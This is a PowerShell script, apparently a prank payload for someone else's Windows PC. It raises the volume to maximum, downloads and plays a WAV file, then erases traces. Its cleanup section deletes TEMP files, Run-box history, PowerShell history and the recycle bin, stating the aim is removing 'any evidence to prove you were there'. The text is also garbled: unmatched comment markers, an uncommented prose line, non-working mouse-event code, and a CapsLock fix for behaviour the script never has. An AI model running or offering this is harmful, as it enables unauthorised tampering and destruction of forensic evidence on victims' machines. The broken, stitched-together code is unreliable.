# This turns the volume up to max level
$k = [Math]::Ceiling(100 / 2)
$o = New-Object -ComObject WScript.Shell
for ($i = 0; $i -lt $k; $i++) {
  $o.SendKeys([char]175)
}

# Download WAV file; replace 'https://...' with your sound URL
$wavUrl = "https://..."  # Replace with your WAV file URL
$wavPath = "$env:TEMP\lol.wav"

# Download the WAV file
Invoke-WebRequest -Uri $wavUrl -OutFile $wavPath

# Function to play WAV asynchronously
function Play-WAV {
  $player = New-Object System.Media.SoundPlayer($wavPath)
  $player.Play()
}

# Pause script until mouse movement is detected using events
Add-Type -AssemblyName System.Windows.Forms
$originalPos = [System.Windows.Forms.Cursor]::Position.X

Register-ObjectEvent ([System.Windows.Forms.Cursor]::Position) MoveDetected {
  if ($_.Position.X -ne $originalPos) {
    Unregister-Event ([System.Windows.Forms.Cursor]::Position, MoveDetected)
  }
}

# Play the sound
Play-WAV

This is to clean up behind you and remove any evidence to prove you were there
#>

# Delete contents of Temp folder 

rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# Delete run box history

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history

Remove-Item (Get-PSreadlineOption).HistorySavePath

# Deletes contents of recycle bin

Clear-RecycleBin -Force -ErrorAction SilentlyContinue

#----------------------------------------------------------------------------------------------------

# This script repeadedly presses the capslock button, this snippet will make sure capslock is turned back off 

Add-Type -AssemblyName System.Windows.Forms
$caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')

#If true, toggle CapsLock key, to ensure that the script doesn't fail
if ($caps -eq $true){

$key = New-Object -ComObject WScript.Shell
$key.SendKeys('{CapsLock}')
}
